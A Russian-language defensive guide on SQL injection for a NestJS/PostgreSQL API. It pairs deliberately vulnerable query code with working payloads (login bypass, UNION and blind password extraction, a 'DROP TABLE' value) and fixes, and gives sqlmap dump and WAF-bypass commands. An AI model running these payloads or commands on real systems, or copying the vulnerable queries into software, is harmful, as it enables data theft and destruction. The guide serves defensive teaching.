# Примеры SQL-инъекций и методы защиты

## 🎯 Реальные примеры атак на ваше API

### 1. Login Bypass (Обход аутентификации)

#### ❌ Уязвимый код:
```typescript
// ОПАСНО! Никогда не делайте так!
async login(email: string, password: string) {
  const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
  const user = await this.connection.query(query);
  return user;
}
```

#### 💀 Атака:
```json
POST /auth/login
{
  "email": "admin' OR '1'='1' --",
  "password": "anything"
}
```

**Результат:** Обход аутентификации, вход как первый пользователь (обычно admin)

**Как работает:**
```sql
-- Оригинальный запрос
SELECT * FROM users WHERE email = 'admin' OR '1'='1' --' AND password = 'anything'

-- Становится
SELECT * FROM users WHERE email = 'admin' OR '1'='1'
-- AND password = 'anything' (закомментировано)

-- '1'='1' всегда true, возвращает всех пользователей
```

#### ✅ Защита (ваш текущий код):
```typescript
// БЕЗОПАСНО
async login(loginDto: LoginDto) {
  const user = await this.userRepository.findOne({
    where: { email: loginDto.email } // Параметризованный запрос
  });
  
  if (!user || user.password !== loginDto.password) {
    throw new UnauthorizedException();
  }
  
  return this.jwtService.sign({ email: user.email, sub: user.id });
}
```

---

### 2. User Enumeration (Перечисление пользователей)

#### ❌ Уязвимый код:
```typescript
@Get('search')
async searchUsers(@Query('name') name: string) {
  const query = `SELECT * FROM users WHERE name LIKE '%${name}%'`;
  return this.connection.query(query);
}
```

#### 💀 Атака:
```bash
# Получить все email
GET /users/search?name=%' UNION SELECT email, password, null, null FROM users --

# Получить версию БД
GET /users/search?name=%' UNION SELECT version(), null, null, null --

# Получить все таблицы
GET /users/search?name=%' UNION SELECT table_name, null, null, null FROM information_schema.tables --
```

#### ✅ Защита:
```typescript
@Get('search')
async searchUsers(@Query('name') name: string) {
  // Валидация
  if (!name || name.length > 50) {
    throw new BadRequestException('Invalid name parameter');
  }
  
  // Параметризованный запрос
  return this.userRepository
    .createQueryBuilder('user')
    .where('user.name LIKE :name', { name: `%${name}%` })
    .getMany();
}
```

---

### 3. Blind SQL Injection (Слепая инъекция)

#### ❌ Уязвимый код:
```typescript
@Get(':id')
async getUser(@Param('id') id: string) {
  const query = `SELECT * FROM users WHERE id = '${id}'`;
  const result = await this.connection.query(query);
  return result.length > 0 ? result[0] : null;
}
```

#### 💀 Атака (Time-based):
```bash
# Проверка существования таблицы через задержку
GET /users/1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN pg_sleep(5) ELSE 0 END) --

# Если ответ приходит через 5 секунд - таблица users существует

# Извлечение данных побитово
GET /users/1' AND (SELECT CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' THEN pg_sleep(3) ELSE 0 END) --
```

#### ✅ Защита:
```typescript
@Get(':id')
async getUser(@Param('id', new ParseUUIDPipe()) id: string) {
  // ParseUUIDPipe валидирует формат UUID
  // TypeORM использует параметризацию
  return this.userRepository.findOne({ where: { id } });
}
```

---

### 4. Second-Order Injection (Инъекция второго порядка)

#### ❌ Уязвимый код:
```typescript
// Шаг 1: Сохранение злонамеренных данных
@Post('register')
async register(@Body() data: RegisterDto) {
  const user = this.userRepository.create(data);
  await this.userRepository.save(user); // Сохраняет как есть
  return user;
}

// Шаг 2: Использование в небезопасном запросе
@Get('profile/:id')
async getProfile(@Param('id') id: string) {
  const user = await this.userRepository.findOne({ where: { id } });
  // ОПАСНО! Использование данных из БД в raw query
  const query = `SELECT * FROM logs WHERE user_name = '${user.name}'`;
  const logs = await this.connection.query(query);
  return { user, logs };
}
```

#### 💀 Атака:
```json
POST /users/register
{
  "name": "Admin'; DROP TABLE users; --",
  "email": "attacker@evil.com",
  "password": "password123"
}

// Затем
GET /profile/{id}
// Выполнится: SELECT * FROM logs WHERE user_name = 'Admin'; DROP TABLE users; --'
```

#### ✅ Защита:
```typescript
@Post('register')
async register(@Body() data: RegisterDto) {
  // Валидация через class-validator
  // @Matches(/^[a-zA-Z\s\-]+$/) в DTO
  const user = this.userRepository.create(data);
  await this.userRepository.save(user);
  return user;
}

@Get('profile/:id')
async getProfile(@Param('id', new ParseUUIDPipe()) id: string) {
  const user = await this.userRepository.findOne({ where: { id } });
  // Всегда используем параметризацию
  const logs = await this.logRepository.find({ 
    where: { userName: user.name } 
  });
  return { user, logs };
}
```

---

### 5. Boolean-Based Blind Injection

#### ❌ Уязвимый код:
```typescript
@Post('check-email')
async checkEmail(@Body('email') email: string) {
  const query = `SELECT COUNT(*) as count FROM users WHERE email = '${email}'`;
  const result = await this.connection.query(query);
  return { exists: result[0].count > 0 };
}
```

#### 💀 Атака:
```bash
# Определение длины пароля администратора
POST /check-email
{"email": "admin@test.com' AND LENGTH((SELECT password FROM users WHERE email='admin@test.com'))>10 --"}
# Ответ: {"exists": true} или {"exists": false}

# Извлечение пароля посимвольно
POST /check-email
{"email": "admin@test.com' AND SUBSTRING((SELECT password FROM users WHERE email='admin@test.com'),1,1)='a' --"}
```

#### ✅ Защита:
```typescript
@Post('check-email')
async checkEmail(@Body() dto: { email: string }) {
  // Валидация
  if (!dto.email || !/^[\w\.-]+@[\w\.-]+\.\w+$/.test(dto.email)) {
    throw new BadRequestException('Invalid email format');
  }
  
  const count = await this.userRepository.count({ 
    where: { email: dto.email } 
  });
  return { exists: count > 0 };
}
```

---

## 🔧 SQLMap команды для тестирования вашего API

### Тест 1: Login endpoint
```bash
python3 sqlmap.py \
  -u "http://localhost:3000/auth/login" \
  --data='{"email":"test*","password":"test*"}' \
  --method=POST \
  --headers="Content-Type: application/json" \
  --batch --level=3 --risk=2 \
  --dbms=PostgreSQL \
  --technique=BEUST
```

**Что проверяется:**
- Boolean-based blind
- Error-based
- Union query-based
- Stacked queries
- Time-based blind

### Тест 2: UUID параметры
```bash
python3 sqlmap.py \
  -u "http://localhost:3000/users/550e8400-e29b-41d4-a716-446655440000*" \
  --batch --level=3 --risk=2 \
  --dbms=PostgreSQL
```

### Тест 3: Извлечение данных (если уязвимость найдена)
```bash
# Список БД
python3 sqlmap.py -u "http://localhost:3000/auth/login" \
  --data='{"email":"test","password":"test"}' \
  --method=POST --headers="Content-Type: application/json" \
  --dbs --batch

# Таблицы
python3 sqlmap.py -u "http://localhost:3000/auth/login" \
  --data='{"email":"test","password":"test"}' \
  --method=POST --headers="Content-Type: application/json" \
  -D chat_db --tables --batch

# Дамп таблицы users
python3 sqlmap.py -u "http://localhost:3000/auth/login" \
  --data='{"email":"test","password":"test"}' \
  --method=POST --headers="Content-Type: application/json" \
  -D chat_db -T user --dump --batch
```

### Тест 4: Агрессивное тестирование с обходом WAF
```bash
python3 sqlmap.py \
  -u "http://localhost:3000/auth/login" \
  --data='{"email":"admin*","password":"test*"}' \
  --method=POST \
  --headers="Content-Type: application/json" \
  --batch --level=5 --risk=3 \
  --threads=10 \
  --tamper=space2comment,between,randomcase \
  --technique=BEUSTQ \
  --dbms=PostgreSQL \
  --random-agent
```

**Параметры:**
- `--level=5` - максимум payload'ов (включая cookies, headers)
- `--risk=3` - опасные запросы (OR-based, UPDATE, DELETE)
- `--tamper` - обход фильтров (замена пробелов, случайный регистр)
- `--threads=10` - 10 параллельных потоков

---

## 🛡️ Ваша текущая защита

### ✅ Реализовано в коде:
1. **TypeORM с параметризацией** - все `.findOne()`, `.find()`, `.save()`
2. **UUID валидация** - `ParseUUIDPipe` в контроллерах
3. **class-validator** - валидация DTO (email, length, regex)
4. **Helmet** - защита HTTP заголовков
5. **Rate Limiting** - 100 запросов/минуту
6. **JWT аутентификация** - для защищенных эндпоинтов
7. **CORS** - ограничен localhost:4200

### ⚠️ Что нужно добавить:

1. **Хеширование паролей** (КРИТИЧНО!):
```bash
npm install bcrypt
npm install -D @types/bcrypt
```

```typescript
import * as bcrypt from 'bcrypt';

// При регистрации
async register(data: RegisterDto) {
  const hashedPassword = await bcrypt.hash(data.password, 10);
  const user = this.userRepository.create({
    ...data,
    password: hashedPassword
  });
  return this.userRepository.save(user);
}

// При логине
async login(loginDto: LoginDto) {
  const user = await this.userRepository.findOne({ 
    where: { email: loginDto.email } 
  });
  
  if (!user || !(await bcrypt.compare(loginDto.password, user.password))) {
    throw new UnauthorizedException();
  }
  
  return { access_token: this.jwtService.sign({ email: user.email, sub: user.id }) };
}
```

2. **Логирование подозрительной активности**:
```typescript
@Injectable()
export class SecurityLogger {
  logSuspiciousActivity(req: Request, reason: string) {
    console.warn('[SECURITY]', {
      timestamp: new Date().toISOString(),
      ip: req.ip,
      method: req.method,
      url: req.url,
      reason,
      headers: req.headers,
    });
  }
}
```

3. **Input Sanitization**:
```typescript
import { escape } from 'validator';

@Transform(({ value }) => escape(value))
name: string;
```

---

## 📊 Интерпретация результатов SQLMap

### ✅ API защищено:
```
[INFO] testing 'PostgreSQL > 8.1 stacked queries'
[WARNING] time-based comparison requires larger statistical model
[INFO] parameter 'email' does not seem to be injectable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' does not appear to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might not be injectable
```

### ⚠️ Требует проверки:
```
[INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[INFO] GET parameter 'id' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
```
→ Проверьте код вручную, возможна ложная тревога из-за медленного ответа

### 🔴 КРИТИЧЕСКАЯ УЯЗВИМОСТЬ:
```
[INFO] the back-end DBMS is PostgreSQL
web application technology: NestJS, Express
back-end DBMS: PostgreSQL 14
[INFO] fetching database names
available databases [3]:
[*] chat_db
[*] postgres
[*] template1

[INFO] fetching tables for database: 'chat_db'
Database: chat_db
[4 tables]
+----------+
| chat     |
| invite   |
| message  |
| user     |
+----------+

[INFO] fetching columns for table 'user' in database 'chat_db'
[INFO] fetching entries for table 'user' in database 'chat_db'
```
→ **НЕМЕДЛЕННО ИСПРАВЬТЕ!** SQL инъекция подтверждена!

---

## 🎓 Обучающие ресурсы

- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [HackTheBox SQL Injection Challenges](https://www.hackthebox.com/)

---

## ⚠️ ВАЖНО

Все примеры предназначены **ТОЛЬКО** для образовательных целей и тестирования **ВАШЕГО СОБСТВЕННОГО** API.

Несанкционированное тестирование чужих систем является **УГОЛОВНЫМ ПРЕСТУПЛЕНИЕМ**.
